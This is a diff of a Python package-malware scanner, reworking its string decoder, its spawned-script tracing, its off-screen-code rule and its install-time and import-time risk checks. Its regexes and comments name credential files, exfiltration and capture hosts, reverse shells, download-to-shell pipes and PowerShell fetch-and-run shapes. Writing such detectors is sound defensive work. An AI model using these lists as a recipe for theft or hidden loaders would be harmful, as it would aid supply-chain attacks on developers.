-        if len(out) >= _DV_MAX_HELPERS:
-            break
-    return out
-
-
-def _dv_literal(m):
-    return m.group("a") or m.group("b") or (m.group("c") if "c" in m.re.groupindex else None)
-
-
-def _dv_bytes(s, kind):
-    """The bytes the literal `s` holds as hex (an even run of hex digits) or
-    as base64 (padded; or unpadded, but for a length of one more than a
-    multiple of 4), else None."""
-    if kind == "hex":
-        return bytes.fromhex(s) if len(s) % 2 == 0 and _DV_HEX_RE.fullmatch(s) else None
-    if _DV_B64_RE.fullmatch(s) is None or len(s) % 4 == 1 or ("=" in s and len(s) % 4):
-        return None
-    return base64.b64decode(s + "=" * (-len(s) % 4))
-
-
-def _dv_xor_printable(data, key):
-    """Is every byte of `data` XORed with `key` (repeated) printable ASCII?"""
-    n = len(key)
-    for i, b in enumerate(data):
-        if not 0x20 <= b ^ key[i % n] <= 0x7e:
-            return False
-    return True
-
-
-def _dv_xor_decoders(view):
-    """{name: (kind, key)}: the names `view` calls as XOR decoders (see
-    above), in the order of their first calls."""
-    calls = {}
-    for m in _DV_CALL_RE.finditer(view):
-        lits = calls.setdefault(m.group("name"), [])
-        if len(lits) < _DV_XOR_MAX_CALLS:
-            lits.append(_dv_literal(m))
-    out, keys = {}, None
-    for name, lits in calls.items():
-        if len(lits) < _DV_XOR_MIN_CALLS:
-            continue
-        kind = "hex" if all(len(x) % 2 == 0 and _DV_HEX_RE.fullmatch(x) for x in lits) else "base64"
-        data = [_dv_bytes(x, kind) for x in lits]
-        if (sum(d is not None for d in data) < _DV_XOR_MIN_CALLS
-                or sum(len(d) for d in data if d is not None) < _DV_XOR_MIN_BYTES):
-            continue
-        if keys is None:
-            keys, seen = [], set()
-            for k in _DV_KEY_RE.finditer(view):
-                key = k.group("a") or k.group("b") or k.group("c")
-                if key not in seen and all(" " <= ch <= "~" for ch in key):
-                    seen.add(key)
-                    keys.append(key.encode("ascii"))
-                    if len(keys) >= _DV_XOR_MAX_KEYS:
-                        break
-        allowed = len(lits) // 10                   # calls that may stay unread
-        for key in keys:
-            bad = 0
-            for d in data:
-                if d is None or not _dv_xor_printable(d, key):
-                    bad += 1
-                    if bad > allowed:
-                        break
-            if bad <= allowed:
-                out[name] = (kind, key)
-                break
-        if len(out) >= _DV_MAX_HELPERS:
-            break
-    return out
-
-
-def _dv_xor_sub(xors):
-    """re.sub's function: a call of an XOR decoder read as its text, when
-    that is printable ASCII."""
-    def sub(m):
-        kind, key = xors[m.group("name")]
-        d = _dv_bytes(_dv_literal(m), kind)
-        if d is None or not _dv_xor_printable(d, key):
-            return m.group()
-        return _dv_quote(bytes(b ^ key[i % len(key)] for i, b in enumerate(d)).decode("ascii"))
-    return sub
-
-
-def decoded_view(text):
-    """`text` read the way it reads once the strings it decodes as it runs
-    are decoded (see above); `text` itself when there is nothing to decode."""
-    if len(text) > _DV_MAX_CHARS or not any(n in text for n in _DV_NEEDLES):
-        return text
-    joined = view = _DV_JOIN_RE.sub("", text) if "+" in text else text
-    if "Buffer" in view:
-        view = _DV_BUFFER_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
-            _dv_decode(m.group("enc"), _dv_literal(m))), view)
-    if "atob" in view:
-        view = _DV_ATOB_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
-            _dv_decode("base64", _dv_literal(m))), view)
-    if "fromhex" in view or "unhexlify" in view or "b64decode" in view:
-        view = _DV_PY_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
-            _dv_decode("hex" if (m.group("fh") or m.group("uh")) else "base64", _dv_literal(m))), view)
-    helpers = _dv_helpers(view)
-    if helpers:
-        call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(helpers))
-                          + _DV_HELPER_CALL_TAIL)
-        view = call.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
-            _dv_decode(helpers[m.group("name")], _dv_literal(m))), view)
-    if "^" in view:
-        xors = _dv_xor_decoders(view)
-        if xors:
-            call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(xors))
-                              + _DV_HELPER_CALL_TAIL)
-            view = call.sub(_dv_xor_sub(xors), view)
-    if view == joined:
-        return text                 # nothing decoded: literals joined alone are no reading of their own
-    arrays = 0
-    for m in list(_DV_ARRAY_RE.finditer(view)):
-        if arrays >= _DV_MAX_ARRAYS:
-            break
-        name = m.group("name")
-        items = _DV_STR_ITEM_RE.findall(m.group("items"))
-        esc = re.escape(name)
-        if (re.search(_DV_NAME_HEAD + esc + _DV_MUTATED_TAIL, view)
-                or len(re.findall(_DV_NAME_HEAD + esc + _DV_ASSIGNED_TAIL, view)) != 1):
-            continue
-        arrays += 1
-        view = re.sub(_DV_NAME_HEAD + esc + _DV_INDEX_TAIL,
-                      lambda i: items[int(i.group(1))] if int(i.group(1)) < len(items) else i.group(), view)
-    return _DV_MEMBER_RE.sub(lambda m: "." + (m.group("a") or m.group("b")), view) if "[" in view else view
 
 
 # ---------------- Scripts a script starts with node or python (0.1.8) ----------------
@@ -7394,347 +4733,32 @@ def decoded_view(text):
 # 2026 lightning release's __init__.py started _runtime/start.py with
 # sys.executable. The install-script and import-time tests follow such a
 # start to the package file it runs (spawned_scripts): node started by
-# spawn / execFile (process.execPath, process.argv[0], 'node') or by fork,
-# Python by Popen / run / call (sys.executable, 'python…'); the script is
-# the first argument that is not a flag, written as a literal (relative to
-# the directory the package runs in), a path.join / path.resolve /
-# os.path.join from the script's own directory (__dirname,
-# os.path.dirname(__file__)) or of literals, `__dirname + '/x'`, or a name
-# assigned one of those in the file (followed _SPAWN_NAME_DEPTH names deep).
+# spawn / execFile (process.execPath, process.argv[0], 'node'; or 'bun' and
+# 'deno', their `run` skipped) or by fork, Python by Popen / run / call
+# (sys.executable, 'python…'); and any program a variable names — a runtime
+# the script fetched: the 2026 setup.mjs loaders downloaded Bun and ran
+# execFileSync(bun, [path.join(dir, 'router_init.js')]) — when what it is
+# given is a file of code (_SPAWN_SCRIPT_EXT_RE; _SPAWN_MAX_NAMED such
+# starts a file). The script is the first argument that is not a flag,
+# written as a literal (relative to the directory the package runs in), a
+# path.join / path.resolve / os.path.join or a pathlib `/` from the
+# script's own directory (__dirname, os.path.dirname(__file__),
+# Path(__file__).parent, dirname(fileURLToPath(import.meta.url)),
+# import.meta.dirname) or of literals, `__dirname + '/x'`, str() of one, or
+# a name assigned one of those in the file (followed _SPAWN_NAME_DEPTH names
+# deep).
 # The started file is then read like the one that started it,
 # _SPAWN_MAX_DEPTH starts deep and _SPAWN_MAX_FILES files per hook at most.
+# A path the file decodes as it runs is read too: the starts are read again
+# in the decoded view (@fnos/app kept its runner's path as character codes).
 _SPAWN_MAX_DEPTH = 3
 _SPAWN_MAX_FILES = 20
-_SPAWN_NAME_DEPTH = 3
-_SPAWN_MAX_TARGETS = 8          # started scripts read from one file, at most
-_SPAWN_CALL_SRC = (
-    r"""\b(?:spawn|spawnSync|execFile|execFileSync)\s*\(\s*(?:process\s*\.\s*execPath|process\s*\.\s*argv\s*\[\s*0\s*\]"""
-    r"""|['"`](?:node|nodejs)(?:\.exe)?['"`])\s*,\s*\[|\bfork\s*\("""
-    r"""|\b(?:Popen|run|call|check_call|check_output)\s*\(\s*\[\s*(?:sys\s*\.\s*executable"""
-    r"""|['"]python[0-9.]*(?:\.exe)?['"])\s*,""")
-_SPAWN_CALL_RE = re.compile(_SPAWN_CALL_SRC)
-_SPAWN_LIT_SRC = (r"""'(?P<a>[^'"`\n$\\]{1,200})'|"(?P<b>[^'"`\n$\\]{1,200})"|`(?P<c>[^'"`\n$\\]{1,200})`""")
-_SPAWN_LIT_RE = re.compile(_SPAWN_LIT_SRC)
-_SPAWN_DIR_SRC = (r"""__dirname|os\s*\.\s*path\s*\.\s*dirname\s*\(\s*(?:os\s*\.\s*path\s*\.\s*(?:abspath|realpath)"""
-                  r"""\s*\(\s*)?__file__\s*\)?\s*\)|Path\s*\(\s*__file__\s*\)\s*(?:\.\s*resolve\s*\(\s*\))?\s*\.\s*parent""")
-_SPAWN_DIR_RE = re.compile(_SPAWN_DIR_SRC)
-_SPAWN_JOIN_SRC = r"""(?:path\s*\.\s*(?:join|resolve)|os\s*\.\s*path\s*\.\s*join)\s*\("""
-_SPAWN_JOIN_RE = re.compile(_SPAWN_JOIN_SRC)
-_SPAWN_CONCAT_SRC = (r"""__dirname\s*\+\s*(?:'/?(?P<a>[^'"`\n$\\]{1,200})'|"/?(?P<b>[^'"`\n$\\]{1,200})""" + '"'
-                     + r"""|`/?(?P<c>[^'"`\n$\\]{1,200})`)|`\$\{\s*__dirname\s*\}/(?P<t>[^`$\n\\]{1,200})`""")
-_SPAWN_CONCAT_RE = re.compile(_SPAWN_CONCAT_SRC)
-_SPAWN_NAME_SRC = r"""[A-Za-z_$][\w$]*"""
-_SPAWN_NAME_RE = re.compile(_SPAWN_NAME_SRC)
-# a name's assignment, as _spawn_path looks one up (the name escaped between them)
-_SPAWN_ASSIGN_HEAD = r"(?<![\w$.])"
-_SPAWN_ASSIGN_TAIL = r"\s*=(?![=>])\s*(?P<e>[^\n;]{1,300})"
-_SPAWN_NO_SCRIPT_FLAGS = frozenset(("-m", "-c", "-e", "-p", "--eval", "--print"))
-_SPAWN_VALUE_FLAGS = frozenset(("-r", "--require", "--import", "--loader", "--experimental-loader", "-W", "-X"))
-
-
-def _spawn_args(text, i, limit=400):
-    """The arguments of a call or a list starting at text[i], as far as the
-    ']' or ')' that closes it, split at its top-level commas (a quote-aware
-    pass over at most `limit` characters); [] when it does not close."""
-    args, depth, start, j, end = [], 0, i, i, min(len(text), i + limit)
-    quote = None
-    while j < end:
-        ch = text[j]
-        if quote is not None:
-            if ch == "\\":
-                j += 2
-                continue
-            if ch == quote:
-                quote = None
-        elif ch in "'\"`":
-            quote = ch
-        elif ch in "([{":
-            depth += 1
-        elif ch in ")]}":
-            if depth == 0:
-                args.append(text[start:j])
-                return [a.strip() for a in args]
-            depth -= 1
-        elif ch == "," and depth == 0:
-            args.append(text[start:j])
-            start = j + 1
-        j += 1
-    return []
-
-
-def _spawn_path(expr, text, names):
-    """(base, path) a script argument names — base 'dir' (the script's own
-    directory) or 'cwd' (the directory the package runs in) — else None."""
-    expr = expr.strip()
-    m = _SPAWN_LIT_RE.fullmatch(expr)
-    if m is not None:
-        lit = m.group("a") or m.group("b") or m.group("c")
-        return None if lit.startswith("-") else ("cwd", lit)
-    m = _SPAWN_CONCAT_RE.fullmatch(expr)
-    if m is not None:
-        return "dir", m.group("a") or m.group("b") or m.group("c") or m.group("t")
-    m = _SPAWN_JOIN_RE.match(expr)
-    if m is not None:
-        parts = _spawn_args(expr, m.end())
-        if not parts or not expr.rstrip().endswith(")"):
-            return None
-        first, rest = parts[0], parts[1:]
-        if _SPAWN_DIR_RE.fullmatch(first):
-            base, segs = "dir", []
-        else:
-            head = _spawn_path(first, text, names)
-            if head is None:
-                return None
-            base, segs = head[0], [head[1]]
-        for part in rest:
-            lit = _SPAWN_LIT_RE.fullmatch(part)
-            if lit is None:
-                return None
-            segs.append(lit.group("a") or lit.group("b") or lit.group("c"))
-        return (base, "/".join(segs)) if segs else None
-    if _SPAWN_NAME_RE.fullmatch(expr) and names > 0:
-        am = re.search(_SPAWN_ASSIGN_HEAD + re.escape(expr) + _SPAWN_ASSIGN_TAIL, text)
-        if am is not None:
-            value = am.group("e")
-            parts = _spawn_args(value + ")", 0)          # its first top-level segment
-            return _spawn_path(parts[0] if parts else value, text, names - 1)
-    return None
-
-
-def spawned_scripts(text):
-    """[(base, path)]: the package scripts `text` starts with node or python
-    (see above), base 'dir' or 'cwd', at most _SPAWN_MAX_TARGETS."""
-    if not any(n in text for n in ("spawn", "execFile", "fork", "Popen", "run", "call", "check_")):
-        return []
-    out = []
-    for m in _SPAWN_CALL_RE.finditer(text):
-        args, skip = _spawn_args(text, m.end()), False
-        for arg in args[:6]:
-            if skip:
-                skip = False
-                continue
-            lit = _SPAWN_LIT_RE.fullmatch(arg)
-            value = None if lit is None else lit.group("a") or lit.group("b") or lit.group("c")
-            if value is not None and value.startswith("-"):   # a flag of node's or python's
-                flag = value.split("=", 1)[0]
-                if flag in _SPAWN_NO_SCRIPT_FLAGS:
-                    break                                 # inline code or a module: no script file
-                skip = flag in _SPAWN_VALUE_FLAGS and "=" not in value
-                continue
-            target = _spawn_path(arg, text, _SPAWN_NAME_DEPTH)
-            if target is not None:
-                path = posixpath.normpath(target[1].replace("\\", "/"))
-                if path not in (".", "") and not path.startswith("/") and (target[0], path) not in out:
-                    out.append((target[0], path))
-            break
-        if len(out) >= _SPAWN_MAX_TARGETS:
-            break
-    return out
-
-
-# ---------------- Code hidden off-screen (SC-OFFSCREEN-CODE, 0.1.8) ----------------
-# @react-native-aria/radio 0.2.14 (June 2025) appended its loader to
-# lib/commonjs/index.js after 731 spaces on the last line — past the right
-# edge of every editor, diff and code review, where the interpreter runs it
-# all the same; setup.py droppers do the same after a `;`. No formatter puts
-# code _OFFSCREEN_MIN columns right of other code or of nothing: indentation
-# stays under 100, and runs that long in the 0.1.7 benchmark's 429 popular
-# packages were all prose (a docstring's alignment, a box drawing). So the
-# run must stand in code, not in a string or a comment (_code_prefix: what
-# comes before it on the line closes every quote and comment it opens; the
-# caller also drops a line that is nothing but literals and comments, like a
-# docstring's), and what follows it must read as code: punctuation that code
-# starts with, a declaration, a name followed by . ( [ = ; or a quote, or a
-# keyword that runs or imports. CRITICAL when the hidden text runs or loads
-# code (require, import, eval, exec, Function, child_process, spawn, a
-# decoder, `global[…]`), else MAJOR.
-_OFFSCREEN_SRC = r"""(?<![ \t])[ \t]{150,}(?=\S)"""
-_OFFSCREEN_CODE_SRC = (
-    r"""[;,(){}\[\]]|(?:const|let|var|function|async|class|def)\s+[A-Za-z_$(]|[A-Za-z_$][\w$]*\s*(?:[.(\[=;]|["'`])"""
-    r"""|(?:import|from|exec|eval|require)\b""")
-_OFFSCREEN_EXEC_SRC = (
-    r"""\b(?:require|import|exec|eval|Function|child_process|spawn|execSync|__import__|compile|b64decode"""
-    r"""|fromCharCode|atob)\b|\bglobal\s*\[""")
-_OFFSCREEN_RE = re.compile(_OFFSCREEN_SRC)
-_OFFSCREEN_CODE_RE = re.compile(_OFFSCREEN_CODE_SRC)
-_OFFSCREEN_EXEC_RE = re.compile(_OFFSCREEN_EXEC_SRC)
-#: The shortest run of blanks before code that counts
-_OFFSCREEN_MIN = 150
-#: Characters of the hidden code read for what it runs
-_OFFSCREEN_READ = 4000
-
-
-def _code_prefix(prefix, lang):
-    """Does `prefix` (the start of a line) close every string and comment it
-    opens — quotes with their escapes, and a JavaScript block comment — and
-    open no line comment (# in Python, // in JavaScript)?"""
-    quote, i, n = None, 0, len(prefix)
-    while i < n:
-        ch = prefix[i]
-        if quote is not None:
-            if ch == "\\":
-                i += 2
-                continue
-            if ch == quote:
-                quote = None
-        elif ch == '"' or ch == "'" or (ch == "`" and lang == "js"):
-            quote = ch
-        elif lang == "py" and ch == "#":
-            return False
-        elif lang == "js" and ch == "/" and prefix.startswith("//", i):
-            return False
-        elif lang == "js" and ch == "/" and prefix.startswith("/*", i):
-            end = prefix.find("*/", i + 2)
-            if end < 0:
-                return False
-            i = end + 2
-            continue
-        i += 1
-    return quote is None
-
-
-def offscreen_code(line, lang):
-    """-> (column, blanks, hidden text, runs code) for code that starts after a
-    run of at least _OFFSCREEN_MIN blanks on `line`, in code (see above),
-    else None. `lang` is 'js' or 'py'."""
-    if len(line) <= _OFFSCREEN_MIN or " " * 16 not in line and "\t" * 16 not in line:
-        return None
-    m = _OFFSCREEN_RE.search(line)
-    if (m is None or _OFFSCREEN_CODE_RE.match(line, m.end()) is None
-            or not _code_prefix(line[:m.start()], lang)):
-        return None
-    hidden = line[m.end():m.end() + _OFFSCREEN_READ]
-    return m.end(), m.end() - m.start(), hidden, _OFFSCREEN_EXEC_RE.search(hidden) is not None
-
-
-_SELF_PUBLISH_RULE = {
-    "id": "SC-SELF-PUBLISH", "name": "Code that republishes its package", "type": "HOTSPOT", "sev": "CRITICAL",
-    "msg": "Renames its package (package.json's \"name\") and publishes it: the shape of registry spam and of "
-           "packages that spread themselves.",
-    "why": ("The 2025-26 registry floods shipped a script that gives package.json a new, random name and runs "
-            "`npm publish` in a loop, from the account of whoever runs it. Release tools publish too, but never "
-            "rename what they publish."),
-    "fix": "Don't run it; report the package to the registry.",
-    "ref": "CWE-506 · Supply chain"}
-_OFFSCREEN_WHY = ("A long run of blanks pushes code past the right edge of editors, diffs and code review, while "
-                  "the interpreter runs it all the same: @react-native-aria/radio 0.2.14 hid its loader 731 "
-                  "columns right. No formatter puts code there.")
-
-
-def _offscreen_issue(path, line_no, lines, found):
-    col, blanks, hidden, runs = found
-    preview = hidden if len(hidden) <= 60 else hidden[:57] + "..."
-    return mk_issue(
-        {"id": "SC-OFFSCREEN-CODE", "name": "Code hidden off-screen", "type": "HOTSPOT",
-         "sev": "CRITICAL" if runs else "MAJOR",
-         "msg": f"Code after {blanks} blanks on this line, where editors and review don't show it: {preview!r}.",
-         "why": _OFFSCREEN_WHY + (" This code loads or runs more code." if runs else ""),
-         "fix": "Read the whole line (turn on word wrap) and review what it does.",
-         "ref": "CWE-506 · Supply chain"}, path, line_no, lines, col)
-
-
-def install_script_risk(text):
-    """Reasons an install-time script looks hostile ([] if none): read as
-    written, and again with the strings it decodes as it runs decoded
-    (decoded_view; a reason found only there says so)."""
-    reasons = _install_script_risk(text)
-    view = decoded_view(text)
-    if view != text:
-        for r in _install_script_risk(view):
-            if r not in reasons:
-                reasons.append(r + _DV_NOTE)
-    return reasons
-
-
-def _install_script_risk(text):
-    reasons = []
-    network = bool(_NETWORK_RE.search(text))
-    if network and _SECRET_SOURCE_RE.search(text):
-        reasons.append("reads environment variables or credential files and sends data over the network")
-    dest = _EXFIL_DEST_RE.search(text)
-    if dest:
-        reasons.append(f"contacts an address typical of data exfiltration ({dest.group(0)[:40]})")
-    if _pipes_download_to_shell(text):
-        reasons.append("pipes a download into a shell")
-    substituted = (("curl" in text or "wget" in text)
-                   and any(runs_substituted_download(row) for row in text.split("\n")))
-    received = _received_code_kind(text)
-    if substituted:
-        reasons.append(_DL_CATEGORY_REASON["run"])
-    elif received is not None:
-        reasons.append(_DL_CATEGORY_REASON[received[1]])
-    reasons.extend(powershell_risk(text))
-    if (received is None or received[1] != "run") and not substituted and stager_at(text) >= 0:
-        reasons.append("carries a script that downloads and runs code")
-    if reverse_shell_at(text) >= 0:
-        reasons.append("opens a reverse shell")
-    host = _HOST_INFO_RE.search(text)
-    if host and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)):        # sends_host_info
-        reasons.append("sends the machine's user or host name over the network")
-    for _at, reason in _exfil_signs(text, host):
-        if reason not in reasons:
-            reasons.append(reason)
-    if dest is None:
-        ip = raw_ip_connect(text)
-        if ip is not None:
-            reasons.append(f"contacts an address typical of data exfiltration ({ip})")
-    if runs_own_source_at(text) >= 0:
-        reasons.append("runs code it reads back from its own file or a data file shipped with it")
-    reasons.extend(persistence_reasons(text))
-    if _PUBLISH_CMD_RE.search(text) is not None:
-        reasons.append("publishes a package to a registry (npm publish)")
-    if _NPM_TOKEN_READ_RE.search(text) is not None:
-        reasons.append("collects npm access tokens")
-    dll = runs_dll(text)
-    if dll is not None:
-        reasons.append(f"runs a DLL with rundll32 or regsvr32 ({dll[:40]})")
-    # a script it downloads, or decodes, written to a file and run with a
-    # shell or an interpreter (a file run on its own stays the import-time
-    # test's MAJOR shape: a prebuilt binary's installer does that)
-    dropped = _downloads_and_runs(text)
-    if dropped is not None:
-        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
-        if interp:
-            reasons.append(f"downloads a script and runs it with {interp}")
-    decoded = _decodes_and_runs(text)
-    if decoded is not None:
-        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
-        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
-                       else "writes a file it decodes and runs it")
-    return reasons
 
 
 # ---------------- Import-time inspection ----------------
-# Code that runs when a package is loaded — what an npm package's main, bin
-# and exports reach, a wheel's top-level packages and modules — gets a weaker
-# version of the install-script test: a MAJOR finding (a weak indicator,
-# WARN), never CRITICAL, and only on shapes ordinary SDKs don't share.
-# Harvesting means the whole environment serialized, or a credential store
-# read (SSH private keys, git credentials, browser local storage): reading
-# the variables it needs, or listing them (Object.keys(process.env),
-# os.environ.copy() for a subprocess), is everyday SDK and CLI code, and so
-# is reading a tool's own config (.npmrc, .pypirc, .netrc, ~/.aws: npm
-# clients, setuptools, distlib and cloud SDKs do, next to their network
-# code — .pypirc alone fired on 5 of 12,278 installed modules). It counts
-# only next to a network call or a named exfiltration service in the same
-# file. An address alone never counts: cloud SDKs read 169.254.169.254, and
-# Telegram, ngrok or pastebin clients name their own service. A download piped
-# into a shell counts only on a line that hands it to an exec call (a CLI's
-# help text often shows `curl … | sh`).
-_IMPORT_HARVEST_RE = re.compile(
-    r"""JSON\.stringify\(\s*process\.env\s*[,)]|"""
-    r"""\bjson\.dumps\(\s*(?:dict\(\s*)?os\.environ\s*[,)]|\b(?:str|repr)\(\s*os\.environ\s*\)|"""
-    r"""\burlencode\(\s*(?:dict\(\s*)?os\.environ\s*[,)]|"""
-    r"""[/\\]\.ssh[/\\]id_|\bid_(?:rsa|ed25519|ecdsa|dsa)\b(?!\.pub)|\.git-credentials|"""
-    r"""(?i:Local Storage)[/\\]leveldb""")
 _EXEC_CALL_RE = re.compile(
     r"""\b(?:execSync|exec|execFileSync|execFile|spawnSync|spawn|system|popen|Popen|run|call|"""
     r"""check_call|check_output|getoutput|getstatusoutput)\s*\(""")
-# Every match of _IMPORT_HARVEST_RE contains one of these (the pattern is
-# case-sensitive but for "Local Storage", and its "leveldb" is not): a text
-# with none of them is not searched. The search took 8 of the 60 seconds of a
-# --deps scan of a large node_modules, which runs it on every file.
-_IMPORT_HARVEST_NEEDLES = ("process.env", "os.environ", "id_", ".git-credentials", "leveldb")
 
 
 # Import-time code that is SUSPICIOUS on its own (audit P0, 0.1.7): the
@@ -7744,11 +4768,18 @@ _IMPORT_HARVEST_NEEDLES = ("process.env", "os.environ", "id_", ".git-credentials
 # they are found — fetch-and-run and the other shapes install_script_risk
 # names that no library needs: code received over the network and run, a
 # download run through a shell, PowerShell that hides or fetches what it
-# runs, a stager string, a reverse shell, credentials or the environment
-# sent to a named exfiltration service, the machine's user or host name sent
-# to a data-capture service (the dependency-confusion beacon), a download
-# run with the Python interpreter (a script, not a binary), and a GitHub
-# Actions workflow that dumps every repository secret (see persistence targets).
+# runs, a stager string, a reverse shell, local data sent to a data-capture
+# service or a public IP address (the dependency-confusion beacon), what no
+# client sends sent to an exfiltration service, a webhook whose secret is
+# written in the code, a sweep of credential folders, the host name hidden
+# in base64, in a DNS name or sent to an address fetched at run time, a
+# miner, a download run with the Python interpreter (a script, not a
+# binary), a GitHub Actions workflow that dumps every repository secret
+# (see persistence targets), wallet addresses swapped, and code built around
+# a string array (_SA_TECHNIQUE_REASON). Since rule set 2.17, what no client
+# sends (the whole environment, a credential store) and what local commands
+# print about the machine count wherever they are sent, and a raw socket's
+# hard-coded public address is an IP address.
 _STRONG_IMPORT_REASONS = (
     "runs code it receives over the network", "runs a downloaded script through a shell",
     "runs an encoded PowerShell command", "runs PowerShell that", "carries a script that downloads and runs code",
@@ -7756,1652 +4787,32 @@ _STRONG_IMPORT_REASONS = (
     "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with",
     "writes code it decodes to a file and runs it with", "runs code it reads back from its own file",
     "carries a GitHub Actions workflow that dumps every repository secret",
-    "sends data to a Telegram bot whose token", "sends data to a Discord webhook whose token",
-    "sends data to a Slack webhook whose key", "reads credential files and sends data to an IP address",
+    "sends data to a webhook whose secret is written in the code",
+    "sends what local commands report about the machine to", "reads local files and sends them to an exfiltration service",
+    "sends the machine's public IP address to", "sends the machine's user or host name to an IP address",
+    "reads credentials or the whole environment and sends them to an IP address",
+    "reads credentials or the whole environment and sends data over the network",
+    "sends what local commands report about the machine over the network",
+    "reads local files and sends them to an IP address",
     "collects files from several credential folders", "sends the machine's user or host name to an address it hides",
-    "sends the machine's user or host name in a DNS lookup", "sends the machine's public IP address to a data-capture",
-    "runs a cryptocurrency miner")
-# Endpoints that exist to capture what is sent to them (out-of-band testing,
-# request inspection): no library reports to one
-_CAPTURE_SERVICE_RE = re.compile(
-    r"webhook\.site|typedwebhook\.tools|oastify\.com|burpcollaborator|\binteract\.sh|\boast[\w.-]*\.(?:pro|live|site"
-    r"|online|fun|me|com)\b|pipedream\.net|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|requestcatcher\.com"
-    r"|hookbin\.com|postb\.in\b|beeceptor\.com"
-    r"|dnslog\.cn|ceye\.io|canarytokens", re.I)
-# An ngrok tunnel's own address counts as one (0.1.8): a subdomain someone's
-# laptop answers. Searched only in a text that names ngrok (the pattern can't
-# be found quickly: it starts with any letter); lower case, as a host name
-# is written in code.
-_NGROK_TUNNEL_RE = re.compile(
-    r"\b[a-z0-9][a-z0-9-]{2,62}\.ngrok(?:-free)?\.(?:app|io|dev)\b|\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b")
-
-
-def capture_service(text):
-    """The first data-capture service `text` names (_CAPTURE_SERVICE_RE), else
-    an ngrok tunnel's address, else None (a match)."""
-    m = _CAPTURE_SERVICE_RE.search(text)
-    if m is None and "ngrok" in text:
-        m = _NGROK_TUNNEL_RE.search(text)
-    return m
-_PY_RUN_RE = re.compile(
-    r"""\[\s*(?:\w*sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
-    r"""|\b(?:system|popen|getoutput|run|call|Popen)\s*\(\s*f?["']python[\d.w]*(?:\.exe)?\s""")
-
-# Prose is not import-time code (0.1.7). On the audit's benign PyPI corpus a
-# CLI's docstring showed `powershell -c "irm … | iex"` and a comment quoted
-# `iwr … | iex` (huggingface-hub), and a docstring named ``id_rsa``
-# (paramiko). A Python or JavaScript file that fails the test is read again
-# with its comments blanked and, in Python, the string literals that stand
-# alone as statements (docstrings, strings used as block comments) — not in
-# a file that reads its own source (open(__file__), __doc__ … see
-# _SELF_READ_RE): a comment can hold what it runs, or its C2 address. The text
-# keeps its line breaks and one character per character, so lines and the
-# patterns' bounds are the file's. PowerShell counts at import time only as
-# an argument of an exec call (`os.system('powershell …')`,
-# `subprocess.run(["pwsh", …])`, over lines): a CLI's self-update code
-# builds the command in one function and runs it in another, and its help
-# text shows one. Both are the test's rule for a download piped into a shell.
-_PY_DOC_HEAD_RE = re.compile(r"[ \t]*[rRuUbB]{0,2}\Z")   # what may precede a statement string on its line
-_PY_JOINS = "([{,=+-*/%&|^<>~@\\.\"'"   # code a string on the next line continues (or joins, as a literal)
-_BRACKET_RE = re.compile(r"[()\[\]{}]")
-_SPACE_TAB_RE = re.compile(r"[ \t]*")
-_PS_EXEC_BACK = 300              # characters before a PowerShell name searched for the exec call it is in
-_PS_EXEC_MAX_NAMES = 200         # PowerShell names examined per text
-
-
-def _py_statement_literals(text, literals, comments):
-    """The spans of `literals` (the lexer's) that stand alone as statements:
-    a string, not an f-string, that begins its line outside brackets, after
-    code that does not continue into it (a backslash, an operator, an open
-    bracket, a comma or another string), with nothing but a comment after it
-    on its line. One pass: each character is read a bounded number of times,
-    however long its line."""
-    out = []
-    marks = sorted([(s, e, True) for s, e in literals] + [(s, e, False) for s, e in comments])
-    depth, pos, last = 0, 0, ""        # bracket depth, end of the last mark, last code character
-    for s, e, is_literal in marks:
-        if s < pos:
-            continue
-        k = text.rfind("\n", pos, s)
-        ls = k + 1 if k >= 0 else (0 if pos == 0 else -1)     # -1: a mark before it on its line
-        prior = last                   # the last code character before the literal's line
-        if ls > pos:
-            code = text[pos:ls].rstrip()
-            if code:
-                prior = code[-1]
-        gap = text[pos:s]
-        for b in _BRACKET_RE.finditer(gap):
-            depth = depth + 1 if b.group() in "([{" else max(0, depth - 1)
-        code = gap.rstrip()
-        if code:
-            last = code[-1]
-        pos = e
-        if not is_literal:
-            continue
-        if e > s:
-            last = text[e - 1]
-        j = _SPACE_TAB_RE.match(text, e).end()
-        if (ls >= 0 and depth == 0 and (not prior or prior not in _PY_JOINS) and _PY_DOC_HEAD_RE.match(text, ls, s)
-                and not (ls >= 2 and text[ls - 2] == "\\") and (j == len(text) or text[j] in "\n#")):
-            out.append((s, e))
-    return out
-
-
-def _blank(text, spans):
-    """`text` with the characters of `spans` (sorted, disjoint) made spaces,
-    its line breaks kept."""
-    if not spans:
-        return text
-    parts, p = [], 0
-    for s, e in spans:
-        s = max(s, p)
-        if e <= s:
-            continue
-        parts.append(text[p:s])
-        parts.append("\n".join(" " * len(row) for row in text[s:e].split("\n")))
-        p = e
-    parts.append(text[p:])
-    return "".join(parts)
-
-
-def _import_code(text, lang):
-    """`text` (a Python or JavaScript file) with its prose blanked (see
-    above) — unchanged when it reads its own source: then its comments and
-    docstrings may be what it runs or where it keeps an address."""
-    if reads_own_source(text):
-        return text
-    literals = [] if lang == "py" else None
-    comments = _lex_comment_spans(text, lang, literals=literals)
-    spans = list(comments)
-    if literals:
-        spans = sorted(spans + _py_statement_literals(text, literals, comments))
-    return _blank(text, spans)
-
-
-def _call_open(rest):
-    """Is a call whose '(' comes just before `rest` still open at its end?"""
-    depth = 1
-    for b in _BRACKET_RE.finditer(rest):
-        depth += 1 if b.group() in "([{" else -1
-        if depth == 0:
-            return False
-    return True
-
-
-def _powershell_run_at(text):
-    """The offset of the first PowerShell name of `text` that is an argument
-    of an exec call opened at most _PS_EXEC_BACK characters before it, else
